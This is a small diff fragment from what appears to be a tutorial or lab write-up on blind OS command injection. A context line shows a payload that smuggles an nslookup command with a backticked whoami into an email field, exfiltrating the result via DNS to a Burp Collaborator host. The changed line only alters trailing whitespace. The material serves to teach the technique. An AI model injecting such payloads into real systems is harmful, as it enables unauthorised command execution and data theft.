@@ -62,7 +62,7 @@ email=x||nslookup `whoami`.abc123.burpcollaborator.net||
 
 **Collaborator receives:**
 ```
-DNS Query: peter-webapp.abc123.burpcollaborator.net
+DNS Query: peter-webapp.abc123.burpcollaborator.net   
           ^^^^^^^^^^^^
           This is the whoami output!
 ```
